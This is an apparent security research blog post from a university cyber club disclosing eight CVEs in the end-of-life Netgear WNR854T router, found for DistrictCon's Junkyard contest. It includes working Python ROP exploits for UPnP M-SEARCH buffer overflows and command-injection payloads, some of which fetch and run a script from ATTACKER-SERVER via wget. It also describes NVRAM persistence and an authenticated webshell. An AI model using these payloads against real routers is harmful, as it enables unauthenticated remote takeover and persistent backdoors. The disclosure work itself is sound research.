+++
author = "Dylan, Danyaal, Ryan"
title = "'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard"
date = "2025-03-25"
description = "How my university club dumpster dived eight CVEs for a year-0 conference including WAN RCE and NVRAM persistence."
tags = [
"arm","firmware analysis","router","0day discovery"
]
+++

A subsect of student members from the Mason Competitive Cyber Club conducted research on an EOL device in preperation for the Junkyard contest at DistrictCon Year 0, unearthing eight new CVEs.

<!--more-->

# Table of content

1.  [Intro and Background](#intro)
2.  [The Junkyard Competition](#junkyard)
3.  [Disclosure Timeline](#timeline)
4.  [A Note on post.cgi](#postcgi)
5.  [Vulnerabilities Discovered](#802)
	1.  [CVE-2024-54802](#802)
	2.  [CVE-2024-54803](#803)
	3.  [CVE-2024-54804](#804)
	4.  [CVE-2024-54805](#805)
	5.  [CVE-2024-54806](#806)
	6.  [CVE-2024-54807](#807)
	7.  [CVE-2024-54808](#808)
	8.  [CVE-2024-54809](#809)

<a name="intro"></a>
# Intro and Background

The following post features technical details regarding vulnerabilities that were discovered in an EOL device by my school’s cybersecurity club in preparation for a competition at the inaugural DistrictCon security conference. For the past few months, Mason Competitive Cyber has been researching a target, namely the WNR854T from the WNR series by Netgear for security vulnerabilities, which was a project run by students and sponsored by club funds. The research resulted in the discovery of eight previously unknown security issues on the product including vulnerabilities that allow for code execution from the WAN and payload injection into NVRAM that persists and triggers across reboot. Proof of concepts were developed and demonstrated live to convey the impact of the discovered issues and showcase the low-hanging fruit that frequently still exist in the world of embedded. Points of contact and timelines were kept with both the DistrictCon organizers and the vendor to ensure a 90-day responsible disclosure time. Bugs mainly consist of improper system calls and memory corruption vulnerabilities across both the router’s upnp and httpd services. It is also important to note that all issues found with upnp are unauthenticated (as the protocol traditionally is) and that the router’s upnp service is exposed to the WAN. Additionally, it was found that one can directly modify nvram parameters on the router from the httpd web panel, although this does require authentication. This can allow for some nice chains such as using normal upnp functionality to port-forward the router’s webshell to the internet and change the username and password via modifying its nvram variables from the web interface or utilizing the disclosed vulnerabilities in upnp. Further to note is that all disclosed CVEs relating to the upnp service are WAN-facing and unauthenticated while CVEs relating to httpd must be attacked from a network-adjacent position and require authentication (factory state has default credentials). Our testing and weaponization utilized local firmware copies and a UART interface on the router. A JTAG interface is also exposed and can be used to reflash the router in the event of bricking (the target has hardware defects) or accidental boot-looping (due to the nature of some persistent nvram bugs). 

<a name="junkyard"></a>
# The Junkyard Competition

The Junkyard competition was an end-of-life pwnathon for disclosing zero-days on end-of-service devices with prize categories consisting of the most memeable target, most impactful target, most novel exploitation technique and their runners-up respectively. The competition specifically consisted of demonstrating live proof-of-concepts against the chosen target live in ten-minute slots. The submission requirements were that the device had been officially recognized as end-of-service by the vendor and that the bugs recieved CVEs (later removed). The Mason Competitive Cyber Team consisted of researchers <a>vWing</a>, <a>draz</a>, and <a>elbee</a>. The target chosen was the Netgear WNR854T, it was chosen because the initial stock of the device would be easily acquirable due to the previous use of the device in <a>draz’s</a> family home. The team was approved for two talk-slots to demonstrate seven of the eight found vulnerabilities on the target.

<br>
<p align="center">
<img src="/assets/2025-03-25/1.png"/>
</p>
<br>

It was found the target device had only one previously reported network-adjacent unauthenticated command execution vulnerability and decided it would be a target with easy wins. Many props to DistrictCon and its organizers for putting together such a unique competition and running a surprisingly high-quality first year conference (even without power!). The club is excited for potentially participating in future Junkyard contests. 

<a name="timeline"></a>
# Disclosure Timeline

<br>
<p align="center">
<img src="/assets/2025-03-25/2.png"/>
</p>
<br>

<a name="postcgi"></a>
# A Note on post.cgi

There exists a route on httpd that allows for configuring arbitrary system information. Authentication is required to access this endpoint which resides at post.cgi. In the data posted to the endpoint, a user can include a “command” key in the data, which can contain the following configuration commands: device_data, reset_to_default, system_restart, system_reboot. The following function checks for device_data (0x12244). Utilizing the device_data command, one can arbritrarly set nvram data if they are authenticated to the web interface. Various nvram parameters are used in both httpd and sysinit for configuration and allow for many persistent and non-persistent command injection scenarios.

<br>
<p align="center">
<img src="/assets/2025-03-25/3.png"/>
</p>
<br>

<a name="802"></a>
# MSEARCH Host BOF (CVE-2024-54802) 

## Summary 

CVE-2024-54802 is a stack-based buffer overflow in the UPnP (Universal Plug and Play) service (/usr/sbin/upnp) affecting the M-SEARCH Host header. The vulnerability is caused by the unbounded nature of strcpy into a fixed-size stack variable at line 0x22bc4 within the advertise_res function (0x22bc4). This vulnerability allows an attacker to corrupt adjacent memory and control execution flow, leading to remote code execution. 

## Vulnerable Component 

This issue is present in the advertise_res function, where the Host header value of an M-SEARCH request is copied into a statically allocated buffer without proper bounds checking. The function fails to enforce size constraints, allowing an attacker to craft an input that exceeds the buffer size and overwrites adjacent memory.

<br>
<p align="center">
<img src="/assets/2025-03-25/4.png"/>
</p>
<br>

In the affected code, a fixed-size buffer is allocated on the stack, and the Host header value is coped using strcpy which doesn't check for any boundings of its length. This leads to a scenario where an attacker can exploit the vulnerability by sending a specifically crafted M-SEARCH request containing an excessively long Host header.

## Attack Type/Impact 

This is classified as a remote exploit that can be triggered without any authentication. Since the UPnP service is running on the WAN side, it is exposed to internet-based attackers, significantly increasing the severity. If successfully exploited, an attacker can achieve remote code execution. 

## Attack Vector 

An attacker can send a maliciously crafted M-SEARCH request containing an oversized Host header to the vulnerable service. This request overflows the stack buffer and hijacks control flow, enabling the execution of arbitrary system commands. Because UPnP operates on a network-accessible interface, this attack can be launched from both network-adjacent positions and over the internet. 

## Exploitation 

By overflowing the stack buffer, an attacker can overwrite the saved return address, redirected execution to attacker-controlled shellcode or a carefully chosen ROP (Return Oriented Programming) chain. Given that the router lacks modern exploit mitigations such as ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention), constructing a reliable exploit is feasible.

```py 

payload_pt1 = b'Z' * 304 
payload_pt2 = b'A' * 4  # R4 
payload_pt2 += b'B' * 4  # R5 - command str will go here 
payload_pt2 += b'C' * 4  # R6 
payload_pt2 += b'D' * 4  # R7 
payload_pt2 += b'E' * 4  # R8 
payload_pt2 += b'\xdc\xd4\x02'  # 0x2d4dc mov r0, r5 {var_9c} ; bl system 
 
 
def send_msearch_pwn(target_port=1900): 
    global payload_pt1 
    global payload_pt2 
 
    ret = p32(0xbeffeb20 + (len(cmd.encode()) * 3) + 1) 
    payload_pt2 = payload_pt2.replace(b'BBBB', ret) 
 
    message = ( 
                      payload_pt1 + b'\r\n' + 
                      payload_pt2 + b'\r\n' + 
                      b'MAN:"ssdp:discover"\r\n' 
                      b'MX:2\r\n' 
                      b'\r\n' 
              ) + p32(0xdeadbeef) + (b" " * 255) + cmd.encode() 
 
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: 
        sock.settimeout(2) 
        sock.sendto(message, (host, target_port)) 
```

In this case, a suitable ROP gadget at 0x2d4dc (mov r0, r5 ; bl system) allows us to pivot execution to system() with a controlled argument. The payload is structured as follows: 
1. Padding: The buffer is filled with a controlled pattern ('Z' * 304) to align with the saved return address. 
2. Register Control: Overwrites R4, R5, R6, R7, and R8. 
3. ROP Gadget: Redirects execution to 0x2d4dc, where mov r0, r5 moves our controlled value into r0, followed by bl system, executing the attacker-supplied command.

<a name="803"></a>

# PPPOE_PEER_MAC Authenticated Command Injection (Boot Persistent) (CVE-2024-54803)

CVE-2024-54803 is an authenticated command injection vulnerability affecting the router's PPPoE configuration. When exploited, this vulnerability allows authenticated attackers to execute arbitrary system commands with root privileges on the affected device. The injected commands persist across device reboots as they are stored in NVRAM, making this a particularly severe vulnerability that provides attackers with permanent access until manually remediated. This can lead to complete compromise of the router, potentially enabling network traffic interception, credential theft, and use of the device as a pivot point for attacking other systems on the network 

The vulnerability exists within the sysinit binary (/bin/sysinit) which processes the `pppoe_peer_mac` NVRAM parameter during system initialization. As shown in the screenshot at address `0x0000d0f4`, a system call is made that incorporates the `pppoe_peer_mac` value without proper sanitization.

<br>
<p align="center">
<img src="/assets/2025-03-25/5.png"/>
</p>
<br>

The fundamental cause is that the router firmware does not perform adequate input validation or sanitization when the `pppoe_peer_mac` parameter is set, nor when it's subsequently used in command execution. Specifically, the value is retrieved at `0x0000d0c0` with `nvram_get("pppoe_peer_mac")` and then passed to the following `sprintf` call at `0x0000d0e4`: `sprintf(str: &var_System_Command_String, format: "pppoe -e %d:%s -k ", r0_4, r3)` where `r3` can contain the unsanitized `pppoe_peer_mac` value. 

By including shell metacharacters such as semicolons (;) and hash symbols (#), an attacker can break out of the intended command context and inject arbitrary commands that will be executed by the system at `0x0000d0f4` via `system(command: &var_System_Command_String)`. 

Since the `pppoe_peer_mac` value is stored in NVRAM, this injection persists across reboots and is executed during the post-boot setup process of the router, making this vulnerability particularly dangerous as a persistence mechanism. 

Exploitation requires authentication to the router's administrative interface. The attacker must either: 
1. Log in to the web administration interface and modify the PPPoE peer MAC setting, or 
2. Send a specially crafted HTTP POST request to the router's `/post.cgi` endpoint 

For this vulnerability to be exploitable, the router needs to be configured to use PPPoE for its WAN authentication, which is controlled by the NVRAM wan_proto parameter. Attackers can conveniently set both parameters in the same malicious request. 

The exploit payload follows this format: 

``` 
pppoe_peer_mac=;command_to_execute # 

``` 

The semicolon (;) terminates the original command, allowing injection of an arbitrary command, while the hash symbol (#) comments out any trailing portions of the original command string. 

For an example attack, an attacker could download and execute a malicious script with: 

``` 
pppoe_peer_mac=;{wget http://ATTACKER-SERVER/malicious_script.sh -P /tmp/ && /tmp/malicious_script.sh} # 

``` 

This exploits the command injection by: 
1. Breaking out of the original command context with the semicolon 
2. Executing commands to download and run a malicious script 
3. Using the hash symbol to comment out the rest of the original command 

A complete attack would typically involve: 
1. Setting `wan_proto` to `pppoe` to ensure the vulnerable code path is executed 
2. Setting `pppoe_peer_mac` to a malicious value containing the injected commands 
3. Waiting for the router to reboot or forcing a reboot 
4. Upon restart, the malicious commands will execute with root privileges 

This vulnerability could be used to establish persistent backdoors, modify network settings, intercept network traffic, or even create boot loops that could render the device inoperable.

<a name="804"></a>

# WAN_HOSTNAME Authenticated Command Injection (Boot Persistent) (CVE-2024-54804)

CVE-2024-54804 is an authenticated command injection vulnerability affecting the router’s WAN hostname configuration. When exploited, this vulnerability allows authenticated attacks to execute arbitrary system commands with root privileges on the affected device. The injected commands persist across device reboot as they are stored in the router’s NVRAM. This can lead to complete compromise of the router, enabling a whole host of malicious activities. 

The vulnerability exists within the sysinit binary (`/bin/sysinit`) which processes the `wan_hostname` NVRAM parameter during system initialization. At address `0x0000cda4` in the binary, a system call is made that incorporates the `wan_hostname` value without proper sanitization.

<br>
<p align="center">
<img src="/assets/2025-03-25/6.png"/>
</p>
<br>

The root cause is that the router firmware does not perform adequate input validation or sanitization when the `wan_hostname` value is set, nor when it is subsequently used in command execution. Specifically, the value is passed to the following `sprintf` call: `0000cd94     sprintf(str: &varCommandString, format: "netbios %s %s &", r4, r3)` where r3 contains our `wan_hostname` value. By including shell metacharacters such as semicolons (`;`) and has symbols (`#`), an attacker can break out of the intended command context and inject arbitrary commands that will be executed by the system. 

Since the `wan_hostname` value is stored in NVRAM, this injection persists across reboots and is executed during the post-boot setup process of the router – making this vulnerability particularly pernicious. 

Exploitation requires authentication to the router’s administrative interface or some form of authentication bypass. The attacker must either: 
- Log into the web administration interface and modify the wan hostname setting 
- Send a specially crafted HTTP POST request to the router’s `/post.cgi` endpoint 

The exploit payload follows this format: 

` wan_hostname=;command_to_execute #` 

The semicolon (`;`) terminates the original command, allowing the following malicious command, while the hash symbol (`#`) comments out any trailing portions of the original command string. 

For example, to change the web admin login password to “pwnd:, the attacker would set: 

` wan_hostname=;nvram set http_passwd=pwnd #` 

This exploits the command injection by: 
- Breaking out of the original command context with a semicolon 
- Executing the command `nvram set http_passwd=pwnd` during the post-boot router setup 
- Using the hash symbol to comment out the rest of the original command 

The provided proof-of-concept script demonstrates this attack by establishing an authenticated session with the router and sending a POST request to the `/post.cgi` endpoint with the malicious `wan_hostname` parameter. The injected command is executed when the router processes this parameter, and since it modifies NVRAM settings, the changes persist across reboots. 

Particularly dangerous examples include establishing persistent backdoors, modifying network settings, or creating boot loops that could render the device inoperable.

<a name="805"></a>

# Sendmail Authenticated Command Injection (CVE-2024-54805)

CVE-2024-54805 represents an authenticated command injection vulnerability within the router's email notification functionality. Upon successful exploitation, attackers with valid credentials can execute arbitrary system commands with root privileges by manipulating the email address field. This attack vector provides on-demand command execution triggered whenever log emails are sent, which can be manually activated with a call to a CGI endpoint on the router’s web server. This gives attackers reliable and immediate access to compromise the router's security, potentially leading to network eavesdropping, credential harvesting, and lateral movement within the connected network. 

The vulnerability originates in the httpd binary (`/bin/httpd`) responsible for handling the router's administration interface. As illustrated in the screenshot, at address `0x0001578c`, the NVRAM parameter `email_address` is retrieved through the `nvram_get("email_address")` function call. This value is subsequently incorporated into a command string at address `0x0001578a` through a `sprintf` operation using the format string `/bin/sendmail %s -f %s &`.

<br>
<p align="center">
<img src="/assets/2025-03-25/7.png"/>
</p>
<br>

The root cause is the absence of input validation or sanitization for the `email_address ` parameter when constructing the shell command. This vulnerability is exploitable through backtick (`) injection. When shell commands are processed, content within backticks is executed first, with its output substituted into the original command context. The router fails to filter or escape these shell metacharacters, allowing arbitrary command execution when the email sending functionality is triggered. 

Exploitation requires authentication to the router's administrative interface, followed by these steps: 
1. Navigate to the email notification settings page 
2. Insert a malicious payload using backticks in the email address field 
3. Configure the email notification settings to be triggered (either scheduled or immediate) 
4. Trigger the email functionality via the `/send_log.cgi` endpoint 

The exploit payload structure is: 

``` 
`command_to_executed`@example.com 
``` 

For example, to download a file from an attacker-controlled server: 

``` 
`wget http://ATTACKER-SERVER/malicious_script.sh -P /tmp/`@example.com 

``` 
The provided proof-of-concept script demonstrates the attack vector by: 
1. Authenticating to the device 
2. Setting the malicious email address through the `post.cgi` endpoint 
3. Enabling immediate alert sending 
4. Triggering execution by requesting the `/send_log.cgi` endpoint 

This vulnerability provides a more flexible on-demand execution mechanism that can be repeatedly triggered without waiting for reboots, making it particularly valuable for maintaining active access to a compromised device.

<a name="806"></a>

# Authenticated Webshell (CVE-2024-54806)

CVE-2024-54806 denotes the existence of a webshell at cmd.cgi (0x15c50). All endpoints that interact with post.cgi require authentication and thus, this webshell is authenticated execution. Note that the webshell does a poor job at displaying execution results.

<br>
<p align="center">
<img src="/assets/2025-03-25/8.png"/>
</p>
<br>

<a name="807"></a>

# AddPortMapping Command Injection (CVE-2024-54807)

CVE-2024-54807 is an unauthenticated command execution vulnerability that exists due to the concatenation of arguments passed to a system call in the upnp binary. Because the upnp service on the router runs on the WAN-facing interface, the device can be attacked from both the WAN and the LAN. This is potentially the most critical vulnerability reported due to its wide attack surface, lack of authentication, and low exploit complexity. 

There exists a command injection vulnerability in the AddPortMapping (0x2b530) SOAP action of the `/upnp/control/WANIPConnection1` control. The vulnerability is due to an invalidated concatenation of the “NewInternalClient” provided in the request into an iptables command that is ultimately passed to system (0x2d3bc).

<br>
<p align="center">
<img src="/assets/2025-03-25/9.png"/>
</p>
<br>

Knowing this an attacker can simply send a payload with a NewInternalClient value such as `<NewInternalClient>192.168.1.3 $(my command here)</NewInternalClient>`to achieve unauthenticated command execution. This seemed to be the easiest argument to target, and other arguments may not be vulnerable due to static comparisons and various format specifiers. Additionally, the attacker could remove evidence of the injection by removing the port mapping afterwards using normal upnp functionality, which is what our initial proof-of-concept achieves.

<a name="808"></a>

# SetDefaultConnectionService BOF (CVE-2024-54808)

CVE-2024-54808 is a stack-based buffer overflow vulnerability that exists in the SetDefaultConnectionService function due to an unconstrained use of `sscanf` into a local variable. The vulnerability results in hijacking program execution via the program counter. Issues with weaponization of this bug were encountered due to environmental constraints, which we will mention at the end of this item. 

There exists a stack-based buffer overflow in the SetDefaultConnectionService (0x28e8c) SOAPAction of the upnp L3Forwarding service endpoint. The format specifies a payload that would include any character excluding a comma, followed by a comma, followed by the payload. Of course, an attacker can exploit this unauthenticated and from either a network-adjacent position or the WAN, due to the interface upnp is run on.

<br>
<p align="center">
<img src="/assets/2025-03-25/10.png"/>
</p>
<br>

The gadget we have been using for other memory corruption vulnerabilities is 0x2d4dc, to move r5 (controlled) into the argument register and call system.

<br>
<p align="center">
<img src="/assets/2025-03-25/11.png"/>
</p>
<br>

The issue with this vulnerability specifically is that one must survive XML-parsing to reach the vulnerable call site. This means that our payload must be constrained to ASCII-range (0x20-0x7e). Note that no sections in the binary (runtime or otherwise) are mapped in a range that does not contain atleast one non-ASCII byte. A partial overwrite also did not prove productive (2nd LSB -> NULL, LSB -> controlled, needs to be terminated) as the return range resides in the middle of a large function with a large call stack, making it infeasible to even survive long enough to reach this function’s epilogue due to skipping argument setup. 

## Constraints on Weaponization 

The original return address exists as the following: `0x0002nnnn`. Ideally, we'd have the ability to do a two-byte overwrite (this would be enough for exploitation as we could return to a gadget that would misalign PC to a heap address, which is executable). Recall ASCII bytes are mapped between 0x20-0x7e. We are however limited to the following constraints primitves due to the nessecary appendage of a null-byte: 
- 0xnnnnnnnn - Full ASCII-overwrite, hard to weaponize, no memory mapped in this range.  
- 0x000200nn - One-byte with null-byte appendage, hard to weaponize, returns near a function prologue and must survive large function with large call-graph to reach function epilogue 
- 0x0002xx00 - Single null-byte overwrite (returns to address right before the callee's call site) 

An initial constrained gadget search considering all constraints yielded no results.

<br>
<p align="center">
<img src="/assets/2025-03-25/12.png"/>
</p>
<br>

It is also important to consider that the UTF-8 charsets include two-byte items, which could allow for additional byte ranges to be specified above the initial ASCII-range.

### One-Byte 

Let’s consider the partial overwrite. Our partial overwrite address range is `[0x20020-0x200bf]` (this address is possible by appending `c3 bf`, UTF-8 encoding for latin ’y’). Unfortunately, this range lands near the beginning of said large function and does not allow for much movement past due to our primitive only affecting the LSB. Note that even at the minimum range, we miss the entire function prologue and stack setup, meaning that we will likely not be able to survive function calls with arguments or instructions that perform memory access (due to our constraint of ASCII data in registers regardless of where we return). Even in the best scenario (the end bound), we must still survive 110 instructions, many of which will dereference ASCII-registers, and additionally survive 10 function calls (all of which are callers themselves). We found when returning to the beginning range, we would frequently crash at dereferencing instructions shortly after the prologue and at the farther range, within function calls. It might be useful if it were possible to return before the function prologue, allowing the function to set up the stack and execution to continue to the epilogue, which could misalign PC. 

<br>
<p align="center">
<img src="/assets/2025-03-25/13.png"/>
</p>
<br>

### Null-Byte 

A null byte overwrite returns to one instruction before the vulnerable caller.

<br>
<p align="center">
<img src="/assets/2025-03-25/14.png"/>
</p>
<br>

This results in a crash due to the missing setting of r0 and the fact that r4 is a controlled register.

<br>
<p align="center">
<img src="/assets/2025-03-25/15.png"/>
</p>
<br>

## Ideas for Full Weaponization 

If it were possible to disregard the null-byte appendage, we could have a two-byte overwrite instead of one-byte. This would greatly increase our return space and include that of a pop-pop-pop-ret gadget, which would result in program flow returning to a heap address. The heap is executable, and it additionally is possible to store shellcode on the heap using request headers. This would only require that we survive random heap execution (likely depending on what data we land on), until adjacent shellcode is reached (likely influenceable by grooming of other objects). 

<a name="809"></a>

# MSEARCH ST BOF (CVE-2024-54809)

## Summary 

CVE-2024-54809 is a stack-based buffer overflow in the UPnP (Universal Plug and Play) service (/usr/sbin/upnp) affecting the M-SEARCH ST header. The vulnerability is caused by improper bounds checking when copying the ST header value into a fixed-size stack variable within the parse_st function at offset 0x23240. This vulnerability allows an attacker to overwrite adjacent memory and gain control of execution flow, leading to remote code execution. 

## Vulnerable Component 

This issue is present in the parse_st function, where the ST header value of an M-SEARCH request is copied into a statically allocated buffer without proper bounds checking. The function does not enforce size constraints, allowing an attacker to craft an input that exceeds the buffer size and overwrites adjacent memory.

<br>
<p align="center">
<img src="/assets/2025-03-25/16.png"/>
</p>
<br>

In the affected code, a fixed-size buffer is allocated on the stack, and the ST header value is copied using strncpy. However, n is derived from an arithmetic operation on user-controlled input, causing strncpy to write more data than intended. 

## Attack Type/Impact 

This is a remotely exploitable vulnerability that does not require authentication. Since the UPnP service is often exposed on the WAN interface, an attacker can trigger this issue over the internet. Successful exploitation enables an attacker to execute arbitrary code on the device, leading to full system compromise. 

## Attack Vector 

An attacker can send a specially crafted M-SEARCH request containing an oversized ST header value to the vulnerable service. This request overflows the stack buffer and hijacks control flow, enabling the execution of arbitrary system commands. Because UPnP operates on a network-accessible interface, this attack can be launched from both network-adjacent positions and over the internet. 

## Exploitation 

By overflowing the stack buffer, an attacker can overwrite the saved return address and redirect execution to attacker-controlled shellcode or a carefully constructed ROP (Return Oriented Programming) chain. Given that the target device lacks modern exploit mitigations such as ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention), constructing a reliable exploit is feasible. 

```py 

payload = b'Z' * 284 
payload += b'A' * 4  # R4 
payload += b'B' * 4  # R5 - command str will go here 
payload += b'C' * 4  # R6 
payload += b'D' * 4  # R7 
payload += b'E' * 4  # R8 
payload += b'\xdc\xd4\x02'  # 0x2d4dc mov r0, r5 {var_9c} ; bl system 
 
 
def send_msearch_pwn(target_port=1900): 
    global payload 
    # Space nopsled might shift depending on len(cmd) (+1 incase null) 
    # This works alot of the time 
    ret = p32(0xbefff540 + (len(cmd.encode()) * 3) + 1) 
    payload = payload.replace(b'BBBB', ret) 
 
    message = ( 
                      b'M-SEARCH * HTTP/1.1\r\n' 
                      b'HOST:239.255.255.250:1900\r\n' 
                      b'MAN:"ssdp:discover"\r\n' 
                      b'MX:2\r\n' 
                      b'ST:uuid:schemas:device:' + payload + b':\x00\r\n' 
                                                             b'\r\n' 
              ) + p32(0xdeadbeef) + (b" " * 255) + cmd.encode()  # point to space nop sled for command processing 
 
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: 
        sock.settimeout(2) 
        sock.sendto(message, (host, target_port)) 

``` 
  

In this case, a suitable ROP gadget at 0x2d4dc (mov r0, r5 ; bl system) allows us to pivot execution to system() with a controlled argument. The payload is structured as follows: 
1. Padding: The buffer is filled with a controlled pattern ('Z' * 284) to align with the saved return address. 
2. Register Control: Overwrites R4, R5, R6, R7, and R8. 
3. ROP Gadget: Redirects execution to 0x2d4dc, where mov r0, r5 moves our controlled value into r0, followed by bl system, executing the attacker-supplied command. 

 